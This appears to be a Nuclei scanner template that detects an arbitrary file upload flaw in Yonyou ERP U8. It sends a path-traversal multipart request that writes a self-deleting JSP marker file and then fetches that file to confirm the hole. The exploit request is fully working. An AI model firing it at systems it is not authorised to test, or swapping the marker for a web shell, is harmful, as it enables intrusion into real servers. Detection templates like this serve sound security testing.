id: yonyou-erp-u8-uploadfiledata-arbitrary-file-upload

info:
  name: yonyou-erp-u8-uploadfiledata-arbitrary-file-upload
  author: HuanXiong
  severity: critical
  description: |-
    
  reference:
    - 
  tags: File Upload

variables:
  username: "{{to_lower(rand_base(6))}}" 

http:
  - raw:
      - |
        POST /UploadFileData?action=upload_file&filename=../{{username}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
        Content-Length: 327
        Accept: */*
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqoqnjtcw
        Accept-Encoding: gzip

        ------WebKitFormBoundaryqoqnjtcw
        Content-Disposition: form-data; name="upload"; filename="{{username}}.jsp"
        Content-Type: application/octet-stream

        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------WebKitFormBoundaryqoqnjtcw
        Content-Disposition: form-data; name="submit"

        submit
        ------WebKitFormBoundaryqoqnjtcw--

      - |
        GET /R9iPortal/{{username}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip

    matchers:
      - type: dsl
        name: 任意文件上传
        dsl:
          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"